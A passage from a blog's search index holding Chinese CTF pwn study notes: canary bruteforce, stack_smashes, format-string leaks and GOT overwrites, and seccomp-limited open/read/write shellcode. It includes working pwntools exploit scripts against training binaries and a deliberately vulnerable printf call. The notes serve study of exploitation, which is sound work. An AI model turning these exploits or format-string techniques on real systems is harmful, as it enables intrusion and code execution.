range(7):\t\tbruteforece1bit()\t\tif i != 6:\t\t\tp.send(&quot;n\\n&quot;)\t\telse:\t\t\tp.send(&quot;y\\n&quot;)context.log_level = &quot;debug&quot;target = 0x000000000040083Eknown = &quot;&quot;bruteforce_canary()canary = u64(known)log.success(&quot;canary:&quot; + hex(canary))p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)p.sendafter(&quot;go\\n&quot;,p2)p.interactive()\n\n逐字节尝试，无“stack smashing detected”报错回显来对Canary的数值进行逐字节爆破。如果输入正确，则没有回显，能得到Canary的这个字节，然后开始下一个字节的爆破；如果输入有误，则爆破不成功，继续下一个爆破的数值，爆破不成功时子进程会报错退出，但不会影响父进程，父进程会一直创建子进程，可以利用这一点实现爆破。得到Canary的具体数值后，可以在父进程进行栈溢出，覆盖返回地址，实现Getshell，也可以在子进程中实现Getshell。因为有了Canary的具体数值，所以可以绕过Canary保护机制\n3.stack_smashesstack_smashes是一种特殊的利用思路。前面已经提到过，在_stack_chk_fail函数中会将_libc_argv[0]的信息打印出来，\n例如(stack smashing detected : [程序名] terminated）如果能够控制__libc_argv[0]中保存的地址为我们想要的信息的地址，那么就能得到相应的数据。\n在 Linux 系统中，程序名通常是通过读取 __libc_argv[0] 这个全局指针来实现的。__libc_argv 是 libc 库内部维护的一个指针数组，其中 __libc_argv[0] 指向当前进程的可执行文件路径字符串。\n攻击者通过任意地址写入（通常通过 ROP 链实现）将 __libc_argv[0] 这个指针的值，从原来的程序名地址，修改为我们想要泄露的数据的地址（例如 flag 的地址）。\n\n🔍 main 函数的标准原型\nint main(int argc, char *argv[], char *envp[]);\n\nargc: 命令行参数个数\nargv: 参数字符串数组指针\nenvp: 环境变量字符串数组指针\n在栈上，这些参数是由 __libc_start_main 调用 main 时传入的。\n所以查看buf的地址\n\n直接下断点到read的位置，看到buf的位置是0x7fffffffdc00\n接着查看libc_argc[1],即文件信息\n0x7fffffffde18\n\n\n计算好偏移之后就可以把libc_argc[0]的地址换为flag的地址了\n脚本from pwn import *p = process(&quot;./stack_smashes&quot;)#gdb.attach(p,&quot;b *0x0000000000400875&quot;)context.log_level = &quot;debug&quot;flag_addr = 0x0601090p2 = &quot;a&quot; * 0x218 + p64(flag_addr)p.sendafter(&quot;stack_smashes\\n&quot;,p2)p.interactive()\n\n\n\n\n\n\n\n\n\n还有就是直接把stack_chk_fail函数的get表村的地址改为后门函数的地址\n\n\n\n偏移是6\n脚本from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)p=remote(&quot;node5.buuoj.cn&quot;,25904)#p = process(&quot;./r2t4&quot;)elf = ELF(&quot;./r2t4&quot;)backdoor = 0x400626#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)p.sendline(payload)p.interactive()\n\n总结来说，ljust(0x38, b’a’) 的目的是：\n确保 read 函数读取到完整的、由我们控制的 56 字节数据。\n防止 read 函数读取到其他不可预测的数据，从而干扰 printf 的行为。\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"格式化字符串","url":"/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","content":"原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。\n通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。\n一般来说，格式化字符串在利用的时候主要分为三个部分：\n(1）格式化字符串函数。\n(2）格式化字符串。\n(3）后续参数，可选。\n用printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary）\nprintf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。\n🧱 常见的格式化字符串符号\n\n\n格式符\n作用\n示例\n\n\n\n\n%x&#x2F;%p\n以十六进制形式输出栈上的值\n%x→0xdeadbeef\n%p通常带0x前缀\n\n\n%d&#x2F;%u\n以十进制输出栈上的值\n%d→3735928559\n\n\n\n%c\n输出栈上值的最低一个字节\n%c→&#39;A&#39;\n\n\n\n%s\n把栈上的值当作地址，输出该地址的字符串\n%s→&quot;Hello&quot;\n\n\n\n%hn\n写入 2 字节（short）\n%hn→ 写入低 2 字节\n\n\n\n%hhn\n写入 1 字节（char）\n%hhn→ 写入低 1 字节\n\n\n\n%n\n将已输出字符数写入栈上的地址\n%n→ 写入0x4到指定地址\n\n\n\n%$p&#x2F;%%$s\n指定第几个参数位置的值\n%4$p→ 第 4 个参数\n\n\n\n%%\n输出一个%字符本身\n%%→%\n\n\n\n\n当用户控制了 printf() 的第一个参数（即格式化字符串），而程序没有进行过滤或限制，就可能造成以下问题：\nchar input[100];fgets(input, sizeof(input), stdin);printf(input);  // ⚠️ 危险！用户输入直接作为格式化字符串\n\n此时，攻击者可以构造输入，如：\n%x %x %x %x %s\n程序会尝试从栈中读取参数，但由于没有提供参数列表，printf() 会继续从栈中“猜测”数据。这可能导致：\n\n泄露栈内存内容（如返回地址、canary、函数指针等）\n\n写入内存（通过 %n 格式符）\n\n\n虽然没有写任何参数，但还是会对应地解析参数，因为在格式化字符串中写了对应的解析方式，所以在后续的函数运行中会解析栈上的元\n素。对于整型值和浮点值，这没有什么问题，不管栈上是什么数据都能够按照整型值和浮点值解析出来，而字符串形式就不一定能解析出来\n了。如果是一个非法地址，比如NULL，那么在解析的时候就会报错，\n因为这个地址按照字符串解析是无法解析出来的，程序就会崩溃。这就是格式化字符串漏洞的基本原理\n利用leakmemory(泄露栈上内容)\n用了 %100s 来防止缓冲区溢出，但并没有限制用户输入的格式符内容 。也就是说：\n\n用户可以输入 %x、%s、%n 等格式符。\n\nprintf 会根据这些格式符从栈中“猜测”数据，从而造成信息泄露或任意地址写入。\n\n\n\nleakmemory(泄露任意地址内存)这里的目标设立泄露isoc99_scanf函数（scanf编译之后是isoc99_scanf在内存中的地址）。\n%k$s\n这里的p是可以更换的，比如更换为s就可以解析栈上的数据为字符串。\nk：表示要打印的参数距离目前格式化字符串参数的距离。\n因为在没有给printf提供对应的字符，但它是一个可变参数函数 ，它会从栈上依次读取数据来填充格式化字符串中的 %p、%x、%s、%n 等指令。\n但你并不知道你输入的字符串在栈上的具体位置，所以你需要：\n\n找到你的输入字符串在栈上的偏移量，才能精准控制读写的内容。 \n\n\n所以偏移量就是4\n所以构造payload &#x3D; p32(scanf_got) + “%4$s”\n相当于print(p32(scanf_got) + “%4$s”)\n所以前四个字节是输出的scanf的got表\n\n 🧠 关键区别：地址 vs 地址的内容\n\n\n\n\n\n\n\n\n\n\n\nscanf_got\nGOT 表中scanf的地址（.got段中的一个位置）\n0x804a008\n就像书的目录页码\n\n\n泄露的地址（leak_addr）\n这个 GOT 表项中存储的值（即scanf的实际地址）\n0xf7e01234\n就像目录页码指向的那一页的内容\n\n\n脚本from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive()\n\nprintf 执行流程：\n\nprintf 会从栈上读取参数；\n它看到 %4$s，会从第 4 个参数位置读取一个地址；\n这个地址是 0x804a018（你写入的 GOT 地址）；\n然后从 0x804a018 地址中读出一个指针（比如 0xf7e01234，即 scanf 的运行时地址）；\n%s 会从 0xf7e01234 开始读取字符串，直到遇到 \\0；\n最终你接收到的数据中包含 0xf7e01234。\n\n📌 总结\n\n\n\n\n\n\n\n\nelf.got[&quot;scanf&quot;]和elf.got[&quot;__isoc99_scanf&quot;]一样吗？\n不一定，取决于编译器\n\n\n为什么会有__isoc99_scanf？\nGCC 编译器为了支持 C99 标准引入的\n\n\n怎么确认用哪个？\n用readelf -r或objdump -TR查看 GOT 表\n\n\n能不能替换？\n只有 GOT 表中存在对应符号时才能替换\n\n\n如果写错了会怎样？\n报错：KeyError\n\n\n\n函数调用完整过程🌟 阶段 0️⃣：在 vulnfunc 里（调用 printf 之前）\n这是已经在 vulnfunc 里，且栈帧已经建立好了。 栈顶在 esp，栈低在高地址方向。\n     ↑ 高地址──────────────────────────────| 参数n（可能是命令行参数）       || 参数2                        || 参数1                        |──────────────────────────────| 返回地址 → main              |──────────────────────────────| 上一个 ebp                   | ← ebp (vulnfunc 的 ebp)──────────────────────────────| vulnfunc 局部变量            || …                            | ← esp （在 vulnfunc 里）      ↓ 低地址\n\n当你刚进入 vulnfunc：\n\nebp → 上一个 ebp\n\nebp+4 → 返回地址（返回到 main）\n\nebp-xx → vulnfunc 的局部变量\n\nesp → 最低处，指向局部变量\n\n\n🌟 阶段 1️⃣：调用 printf(format)\n当 vulnfunc 调用：\nprintf(format);\n\n调用者把返回地址 &amp; 参数压入栈：\n     ↑ 高地址──────────────────────────────| 参数n（main 的参数）           || …                            |──────────────────────────────| 返回地址 → main              |──────────────────────────────| 上一个 ebp                   | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量            |──────────────────────────────| 参数1=format                 | ← esp+4| 返回地址 → vulnfunc+下一条   | ← esp      ↓\n\n此时 esp 指向 printf 的返回地址，再往上是 printf 的参数。\n🌟 阶段 2️⃣：进入 printf 后\n在 printf 开始执行后，它建立自己的栈帧：\n      ↑ 高地址──────────────────────────────| 参数n（main 的参数）           || …                            |──────────────────────────────| 返回地址 → main              |──────────────────────────────| 上一个 ebp                   | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量            |──────────────────────────────| 参数1=format                 | ← ebp+8| 返回地址 → vulnfunc+下一条   | ← ebp+4| 上一个 ebp                   | ← ebp (printf)──────────────────────────────| printf 局部变量              | ← esp      ↓\n\n这里：\n\nprintf 把当前的 ebp 压栈\n把 ebp 设置为 esp\nesp 再向下留出局部变量空间\n\n\nscanf函数会把读取到的数放在栈上一个空间，然后%p会把它泄露出来\n\n使用 scanf 读取一个字符串（最多 100 字节），存入 format 缓冲区；\n然后直接将这个字符串作为参数传给 printf，即：printf(format);\n\noverwrite(覆盖任意地址内存)\n\n所以这道题的重点是修改几个数的值\n1）将a覆盖为0x10。\n2）将b覆盖为2。\n3）将c覆盖为0x12345678。\n其中a是局部变量，b,c是全局变量\n局部变量存储在栈上，全局变量存储在数据段中（分为已初始化rodata和未初始化bss两部分）\n+---------------------+ &lt;--- 高内存地址| 命令行参数 &amp; 环境变量 |+---------------------+|       栈 (Stack)    |  &lt;-- 局部变量、函数参数、返回地址|                     ||   Function Call N   ||   (局部变量, 返回地址等)||   Function Call 2   ||   (局部变量, 返回地址等)||   Function Call 1   ||   (局部变量, 返回地址等)||        ...          ||                     ||        空闲         ||                     |+---------------------+|       堆 (Heap)     |  &lt;-- 动态分配内存 (malloc/new)|                     ||        ...          |+---------------------+|   .bss 段 (未初始化数据) |  &lt;-- 未初始化的全局变量和静态变量 (例如: b)+---------------------+|   .data 段 (已初始化数据) |  &lt;-- 已初始化的全局变量和静态变量 (例如: c)+---------------------+|     .text 段 (代码)   |  &lt;-- 程序执行代码 (指令)+---------------------+|       保留区域      |+---------------------+ &lt;--- 低内存地址\n\n\n\na的处理（局部变量）首先，a是局部变量，局部变量是存储在栈上的，其地址会因为开启ASLR而变化，所以在函数中将a的地址打印出来了\n脚本from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m)\n\nint和u32()\n\n\n\n函数\n\n\n\n\n\n\nint(..., 16)\n接收到的是字符串形式的地址（如&quot;0xffa79dbc&quot;）\n转换为整数地址\n主动泄露地址\n\n\nu32(...)\n接收到的是原始 4 字节数据（如b&#39;\\xbc\\x9d\\xa7\\xff&#39;）\n将小端序的 4 字节转为整数\n调用泄露地址\n\n\n🧩 p32(a_addr) 是怎么用的？\n构造的 p32(a_addr) 会被 printf 当作一个参数处理：\n\n它被压入栈上；\n%8$n 会从第 8 个参数位置读取它；\n这个地址就是写入的目标地址。\n\n🧩 %12c 是怎么用的？（目标是16，a的地址占四个字节）\n\n%12c 输出 12 个字符（如空格）；\n%n 会把当前输出的字符总数写入指定地址；\n所以 %12c 的作用是让 %n 写入 12；\n它本身不写入内存，但会影响 %n 的值。\n\n不能换成b’a’*12,这个不会影响%n的总数\n工作原理：\n\n当 printf(payload) 执行时，payload 字符串会被放到栈上。\nprintf 开始解析 payload。它会把 p32(a_addr) 视为一个普通的字符串（但它实际上是 v1 的地址）。\n然后遇到 %12c，它输出 12 个字符。\n接着遇到 %8$n。此时 printf 已经输出了 12 个字符。它会去栈上寻找第 8 个参数的地址。由于 p32(a_addr) 放在了 payload 的开头，并且其长度是 4 字节，它会正好落在栈上第 8 个参数的位置上（这个偏移量是经过调试确定的）。\nprintf 会将当前已输出的字符数 12 写入到 p32(a_addr) 所表示的地址，也就是局部变量 v1 的地址。\n最终，v1 的值被修改为 12。\n\nb的处理（全局小数）\nb,c的地址可以直接找到\n脚本from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info:  print(b&quot;Success\\n&quot;)p.interactive()\n\n为什么不能按照覆盖 a 的方法？（因为%n，b的地址已经超过2了，所以b的地址只能在%_$n之后）\n\n偏移量计算的差异： 在覆盖 a 的方法中，p32(a_addr) 放在了 payload 的最开头，并且 printf 发现这个开头在它的参数列表中是第 8 个。 但是，如果将 p32(b_addr) 也放在 payload 的开头并尝试用 %8$n 写入，可能会遇到问题：\n地址值与格式符冲突：0x0804A028 这个地址本身如果被 printf 解析成格式化字符串的一部分，可能会包含 % 或其他特殊字符，导致 printf 崩溃或行为异常。例如，地址的某个字节可能被解释为 %s 或 %x 的一部分，导致 printf 试图读取无效的内存地址。\n控制性问题：我们通常希望将要写入的地址放在格式字符串的末尾，这样它就不会被 printf 误认为是格式符的一部分来处理，而只是一个普通的 4 字节数据。\n\n\n\n\n\n\n特性\n覆盖 v1 (局部变量)\n覆盖 b (全局变量)\n\n\n\n目标类型\n栈上的局部变量\n数据段上的全局变量\n\n\n地址来源\n运行时泄露 (每次可能不同)\n静态固定 (编译时确定)\n\n\np32(addr) 位置\n放在 payload 的开头\n放在 payload 的末尾\n\n\n%n 偏移\n8$ (因为地址放在开头，且在第 8 个参数位置)\n10$ (因为地址放在末尾，且在第 10 个参数位置)\n\n\n主要考量\n确保 p32(addr) 不被误解为格式符，且在正确偏移\n避免 b_addr 字节被误解为格式符，更稳定地作为参数地址\n\n\n好的，如果你确认这个 b 是必须的，那么它在 payload 中的存在，就意味着它在栈的布局和 printf 对参数的解析中起到了关键作用，通常是保证了 p32(b_addr) 的正确对齐，使其落在 %10$n 预期的参数位置。\n让我们来详细分析，为什么多一个 b 反而可能成为“必须的”。\n有 b 的详细分析\npayload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr)\n\n让我们计算每个部分的长度：\n\nb&quot;aa&quot;：2 字节\nb&quot;%10$n&quot;：5 字节\nb&quot;b&quot;：1 字节\np32(b_addr)：4 字节 (假设 b_addr 是 0x0804A028)\n\n总字节数 &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 字节,在这里，b是为了补足字节\nc的处理（全局大数）\n这是一个很大的数，考虑逐字节写入\n这里想把c覆盖为0x12345678，而c的地址是0x0804A02C，所以基本目标是：\n0x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12\n\n脚本from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info:  print(b&quot;Success&quot;)p.interactive()\n\n\n\nfmtstr_payloadfmtstr_payload 是 pwntools 提供的一个自动化工具 ，用于构造格式化字符串漏洞（Format String Vulnerability）的 payload 。\n它的作用是：\n\n自动计算字符数并构造 payload，用于写入任意地址的值（如 GOT 表、变量、返回地址等） \n\n🧪 fmtstr_payload 的使用方法\n\n基本语法\n\nfrom pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)\n\n\n参数说明\n\n\n\n\n\n\n\n\n\noffset\n格式化字符串偏移量（你的输入在第几个%p的位置）\n\n\nwrites\n一个字典，表示你要写入的地址和值，如&#123;addr1: value1, addr2: value2&#125;\n\n\nnumbwritten\n已经输出的字符数（默认为 0，可以忽略）\n\n\nwrite_size\n写入大小，可选：&#39;byte&#39;、&#39;short&#39;、&#39;int&#39;（默认是&#39;byte&#39;）\n\n\n🧩 示例 1：写入一个地址为 16\nfrom pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8  # 偏移量addr = elf.symbols[&#x27;a&#x27;]  # 假设你要写入变量 a 的地址# 构造 payload：写入 a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive()\n\n\n\n🧩 示例 2：写入多个地址（如 a=16, b=2, c=0x12345678）\nfrom pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# 构造 payload：写入多个地址writes = &#123;    a_addr: 16,    b_addr: 2,    c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\nfmt_demo（格式化字符串的综合利用）\n\n可以先泄露libc的基址，得到system函数的地址\n再根据此把printf的got表存储的地址换为system函数的地址\n之后输入参数“&#x2F;bin&#x2F;sh”,就可以实现\n脚本from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive()\n\n\n\n\n\n\n\n\n\n\n那为什么还要填补 payload 的长度为 0x100 字节？”\n\n我们来从 “payload 被复制到栈上” 这个现象出发，解释为什么我们有意地 将 payload 填充到固定长度（如 0x100 字节），尽管它可能会被复制到栈上。\n✅ 简短回答：\n\n我们填补 payload 到固定长度（如 0x100 字节），是为了让 payload 被完整复制到栈上，从而让偏移固定、布局可控，便于利用格式化字符串漏洞进行地址泄露或写入操作。 \n\n📌 payload 的两种“命运”：\n\n\n\n\n\n\n\n\n\n\n1️⃣ payload 短\n&lt; 一些参数长度\nprintf从栈上读取参数\npayload 在 buf 中，参数在栈上\n\n\n2️⃣ payload 长\n&gt; 一定长度（如 100 字节）\nprintf把 payload 复制到栈上\npayload 本身就在栈上\n\n\n🧩 为什么要“故意”让 payload 被复制到栈上？\n✅ 优点一：偏移固定，便于调试\n\npayload 被复制到栈上后，它在栈上的位置是固定的。\n我们可以精准控制偏移（比如 %4$s 就一定读取 payload 中的地址）。\n避免了因 payload 长度不同导致偏移变化的问题。\n\n✅ 优点二：便于构造写入操作（如 %n）\n\n当我们想用 %n 写某个地址时，需要确保地址在栈上，且偏移固定。\n如果 payload 被复制到栈上，我们就可以把地址放在 payload 开头，然后用 %1$n 精准写入。\n\n✅ 优点三：防止 payload 被截断或偏移漂移\n\n如果 payload 长度不固定，可能导致偏移变化，%s、%n 读写错误地址。\n填充到固定长度（如 0x100）可以避免这种漂移。\n\n:grey_question:但我其实不太理解   \n","categories":["pwn_study"],"tags":["PWN","格式化字符串"]},{"title":"simple_shellcode","url":"/2025/08/29/simple-shellcode/","content":"题目\n\n\nMEMORY[0xCAFE0000]: 这部分表示程序正在访问内存地址 0xCAFE0000 处的内容。\n(): 在 C&#x2F;C++ 等编程语言中，圆括号 () 通常表示函数调用。\n\n合起来，这句话的意思就是：将内存地址 0xCAFE0000 中的内容视为一个函数（或一段可执行代码），并立即执行它。\n\n该沙箱主要通过 seccomp 过滤器禁用了与执行新程序和提升权限相关的系统调用，特别是 execve 和 execveat\n在main函数可以看到只能输入0x10个字符，这个长度无法构建shellcode\n所以调用一个长度足够的read函数读入(12个字节)\nread的三个参数。rdi是文件描述符，rsi是写入位置，rdx是写入长度\nrdx执行read的时候是0x10\n\n但是当他运行到调用buf的时候，rdx的数值是buf的地址\n\nxor rdi, rdi：1 字节 (\\x48\\x31\\xff)mov rsi, rdx：3 字节 (\\x48\\x89\\xd6)add rsi, 0xc：3 字节 (\\x48\\x83\\xc6\\x0c)syscall：2 字节 (\\x0f\\x05)\n\n然后就可以对flag文件进行操作\n脚本\nfrom pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;, 21185)io = process(&quot;./vuln&quot;)elf = ELF(&quot;./vuln&quot;)gdb.attach(io)io.recvuntil(b&quot;shellcode:\\n&quot;)read_code = &quot;&quot;&quot;xor rdi, rdimov rsi, rdxadd rsi, 0xcsyscall&quot;&quot;&quot;io.send(asm(read_code))shellcode = shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(3, 0xCAFE0000 + 0x100, 0x100)shellcode += shellcraft.write(1, 0xCAFE0000 + 0x100, 0x100)io.sendline(asm(shellcode))io.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","orw","code"]},{"title":"[NSSRound#14 Basic]rbp","url":"/2025/09/01/NSSRound-14-Basic-rbp/","content":"","categories":["exercise_pwn"],"tags":["PWN"]}]